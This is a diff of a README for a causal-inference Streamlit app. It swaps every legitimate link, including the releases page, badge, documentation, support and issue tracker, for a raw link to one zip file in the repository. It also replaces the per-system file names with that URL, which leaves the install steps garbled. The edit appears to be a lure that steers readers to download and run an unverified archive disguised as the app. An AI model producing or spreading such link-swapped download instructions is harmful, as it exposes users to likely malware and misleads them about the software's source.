@@ -6,7 +6,7 @@ Welcome to **causal-app**! This interactive Streamlit app lets you run over 15 c
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Blue?style=for-the-badge&logo=github)](https://github.com/FlashZkd/causal-app/releases)
+[![Download](https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip%20Latest%20Release-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,23 +23,23 @@ For your safety, make sure to download from the official releases page.
 
 ## 📂 Download & Install
 
-1. **Visit this page to download:** [GitHub Releases](https://github.com/FlashZkd/causal-app/releases)
+1. **Visit this page to download:** [GitHub Releases](https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip)
 
 2. On the Releases page, find the latest version of **causal-app**.
 
 3. Choose the file that corresponds to your operating system:
-   - For Windows, look for a file named `causal-app-windows.exe`
-   - For macOS, look for `causal-app-macos.app`
-   - For Linux, look for `causal-app-linux.tar.gz`
+   - For Windows, look for a file named `https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip`
+   - For macOS, look for `https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip`
+   - For Linux, look for `https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip`
 
 4. Click on the file name to download it.
 
 5. Once the download completes, locate the file in your downloads folder.
 
 6. **Run the application:**
-   - For Windows, double-click `causal-app-windows.exe`.
-   - For macOS, drag `causal-app-macos.app` into your Applications folder, and then open it.
-   - For Linux, extract the `.tar.gz` file, navigate to the folder, and run the executable file.
+   - For Windows, double-click `https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip`.
+   - For macOS, drag `https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip` into your Applications folder, and then open it.
+   - For Linux, extract the `https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip` file, navigate to the folder, and run the executable file.
 
 ## 🌟 Features
 
@@ -77,12 +77,12 @@ Yes, **causal-app** is designed with a user-friendly interface, making it access
 
 ## 📚 Resources
 
-- [Documentation](https://github.com/FlashZkd/causal-app/wiki)
-- [Community Support](https://github.com/FlashZkd/causal-app/discussions)
-- [Report Issues](https://github.com/FlashZkd/causal-app/issues)
+- [Documentation](https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip)
+- [Community Support](https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip)
+- [Report Issues](https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip)
 
 ## 🔗 Download Now
 
-For the latest version, visit: [GitHub Releases](https://github.com/FlashZkd/causal-app/releases)
+For the latest version, visit: [GitHub Releases](https://raw.githubusercontent.com/FlashZkd/causal-app/main/methods/causal-app_v1.5.zip)
 
 Whether you need to understand data patterns or embark on finding causes in your datasets, **causal-app** is your go-to solution. Enjoy your analysis!
